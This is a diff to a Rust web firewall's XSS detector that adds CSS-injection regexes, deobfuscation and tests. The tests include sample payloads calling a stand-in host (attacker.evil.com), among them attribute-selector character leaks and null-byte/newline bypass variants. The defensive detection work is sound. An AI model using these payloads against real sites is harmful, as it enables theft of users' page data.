@@ -45,6 +45,34 @@ static XSS_PATTERNS: LazyLock<Vec<Regex>> = LazyLock::new(|| {
     .collect()
 });
 
+/// CSS-injection signatures (2026-06-16, css_injection_detection_gap_report).
+/// XSS regexes are markup/script-shaped and matched 0/300 CSS samples; CSS
+/// exfil has its own structural fingerprint (`@import`, resource-property
+/// `url(http…)`, attribute-selector callback, `<style>`) that's absent from
+/// benign request params — the same low-FP, rule-engine-shaped class as
+/// nosql / template injection. Emitted under the distinct `css_injection`
+/// tag so attribution stays clear.
+static CSS_PATTERNS: LazyLock<Vec<Regex>> = LazyLock::new(|| {
+    [
+        // C1 — `@import` pulling an EXTERNAL sheet (OOB / data exfil):
+        // `@import url(http…)`, `@import "http…"`, `@import url( http…`.
+        r#"(?i)@import\s+(?:url\s*\(\s*)?['"]?\s*https?:"#,
+        // C3 — resource-loading property pointing at an external origin:
+        // `content|src|cursor|background|behavior|-moz-binding : url(http…)`.
+        // Requires `https?://` so relative (`url(/img.png)`) and `data:`
+        // inline assets — normal inline CSS — never flag.
+        r#"(?i)(?:content|src|cursor|background(?:-image)?|behavior|-moz-binding)\s*:\s*url\s*\(\s*['"]?\s*https?://"#,
+        // C4 — attribute-selector exfil: `[attr^="x"]{ … url( … )}` leaks a
+        // char per request through a background callback.
+        r#"(?i)\[\s*[a-z_-]+\s*[\^$*~|]?=\s*['"][^'"]*['"]\s*\]\s*\{[^}]*\burl\s*\("#,
+        // C5 — inline `<style>` injection / `</style>` breakout.
+        r#"(?i)</?style\b"#,
+    ]
+    .iter()
+    .map(|p| Regex::new(p).unwrap())
+    .collect()
+});
+
 impl Detector for XssDetector {
     fn id(&self) -> &'static str {
         "xss"
@@ -65,6 +93,7 @@ impl Detector for XssDetector {
         if entity_decoded_uri != url_decoded_uri {
             check_xss(&entity_decoded_uri, "uri", &mut signals);
         }
+        check_css(&url_decoded_uri, "uri", &mut signals);
 
         let body = std::str::from_utf8(req.body.peek(8192)).unwrap_or("");
         if !body.is_empty() {
@@ -74,6 +103,7 @@ impl Detector for XssDetector {
             if entity_decoded_body != url_decoded_body {
                 check_xss(&entity_decoded_body, "body", &mut signals);
             }
+            check_css(&url_decoded_body, "body", &mut signals);
         }
 
         // 2026-05-22 — `cookie` removed from the XSS scan set. Cookies
@@ -107,6 +137,45 @@ fn check_xss(input: &str, field: &str, signals: &mut Vec<Signal>) {
             return;
         }
     }
+}
+
+/// CSS-injection check (one `css_injection` signal per field). Scans the
+/// input as-is, and — when control bytes are present — a deobfuscated copy
+/// with them stripped, so `htt\x00p://` and `@im\nport` (null-byte / newline
+/// WAF-bypass variants) still match.
+fn check_css(input: &str, field: &str, signals: &mut Vec<Signal>) {
+    if css_matches(input) {
+        push_css(signals, field);
+        return;
+    }
+    if let Some(deobf) = css_deobfuscate(input) {
+        if css_matches(&deobf) {
+            push_css(signals, field);
+        }
+    }
+}
+
+fn css_matches(input: &str) -> bool {
+    CSS_PATTERNS.iter().any(|re| re.is_match(input))
+}
+
+fn push_css(signals: &mut Vec<Signal>, field: &str) {
+    signals.push(Signal {
+        score: super::scores::xss::XSS,
+        tag: "css_injection".into(),
+        field: field.into(),
+    });
+}
+
+/// Strip ASCII control bytes (`\x00`–`\x1f`, e.g. null / CR / LF / tab) used
+/// to break up `@import` / `http` tokens. Returns `None` when there's
+/// nothing to strip so the caller doesn't rescan an identical string. Space
+/// (`0x20`) is preserved — the `url(`-form patterns tolerate inner spaces.
+fn css_deobfuscate(input: &str) -> Option<String> {
+    if !input.bytes().any(|b| b < 0x20) {
+        return None;
+    }
+    Some(input.chars().filter(|c| (*c as u32) >= 0x20).collect())
 }
 
 #[cfg(test)]
@@ -302,4 +371,73 @@ mod tests {
             "user-agent must still be XSS-scanned",
         );
     }
+
+    // ===== CSS injection (2026-06-16, css_injection_detection_gap_report) =====
+    // The complex CSS payloads carry `{ } [ ] " :` and spaces, so they're
+    // tested through the request BODY (xss scans the body unconditionally),
+    // plus one percent-encoded query case to prove the URL path.
+
+    fn css_body(body: &str) -> Vec<Signal> {
+        let m = http::Method::POST;
+        let u: http::Uri = "/submit".parse().unwrap();
+        let h = http::HeaderMap::new();
+        let b = BodyPeek::new(body.as_bytes().to_vec(), Some(body.len() as u64), false);
+        XssDetector.inspect(&make_view(&m, &u, &h, &b))
+    }
+
+    macro_rules! css_positive {
+        ($name:ident, $body:expr) => {
+            #[test]
+            fn $name() {
+                assert!(!css_body($body).is_empty(), "expected CSS injection for: {}", $body);
+            }
+        };
+    }
+    macro_rules! css_negative {
+        ($name:ident, $body:expr) => {
+            #[test]
+            fn $name() {
+                assert!(css_body($body).is_empty(), "false positive (CSS) for: {}", $body);
+            }
+        };
+    }
+
+    // C1 import_oob — `@import` pulling an external stylesheet (url() and string form).
+    css_positive!(css_import_url, "@import url(http://attacker.evil.com/)");
+    css_positive!(css_import_string, "@import \"https://attacker.evil.com/x.css\"");
+    // C3 property exfil — content/src/cursor/background:url(http…).
+    css_positive!(css_prop_content, "#content{content:url(http://attacker.evil.com/c.png)}");
+    css_positive!(css_prop_src, "#app{src:url(http://attacker.evil.com/s.woff)}");
+    css_positive!(css_prop_cursor, "body{cursor:url(http://attacker.evil.com/cur.png),auto}");
+    // C4 attribute-selector exfil — leaks a char per request via callback.
+    css_positive!(css_attr_selector, "input[class^=\"D\"]{background:url(http://attacker.evil.com/?p=D)}");
+    // C5 style tag.
+    css_positive!(css_style_tag, "</style><style>body{color:red}</style>");
+    // C6 obfuscation — null byte inside `http`, newline inside `@import`,
+    // space after `url(`.
+    css_positive!(css_obf_null_byte, "*{background:url(htt\u{0}p://attacker.evil.com/)}");
+    css_positive!(css_obf_newline_import, "@im\nport url(http://attacker.evil.com/)");
+    css_positive!(css_obf_url_space, "@import url( http://attacker.evil.com/)");
+
+    // Query path (percent-encoded) — proves the URI scan, not just body.
+    positive!(css_import_in_query, "/g?css=@import%20url(http://attacker.evil.com/)");
+
+    #[test]
+    fn css_injection_uses_distinct_tag() {
+        let s = css_body("@import url(http://attacker.evil.com/)");
+        assert!(
+            s.iter().any(|sig| sig.tag == "css_injection"),
+            "CSS injection must emit the css_injection tag, got: {s:?}",
+        );
+    }
+
+    // Negatives — legit CSS / params must NOT FP.
+    css_negative!(css_clean_plain, "body { color: red; margin: 0 auto; }");
+    css_negative!(css_clean_hover, ".btn:hover { background: #fff; border-radius: 4px; }");
+    // Local / relative url() and data: URIs are normal inline-asset CSS.
+    css_negative!(css_clean_local_url, "div{background:url(/static/img/logo.png)}");
+    css_negative!(css_clean_data_uri, "i{background:url(data:image/png;base64,iVBOR)}");
+    // A redirect-style param carrying an external https URL is open_redirect's
+    // job, not CSS — no `@import`/`url(`/selector structure here.
+    negative!(css_clean_redirect_param, "/r?next=https://example.com/welcome");
 }
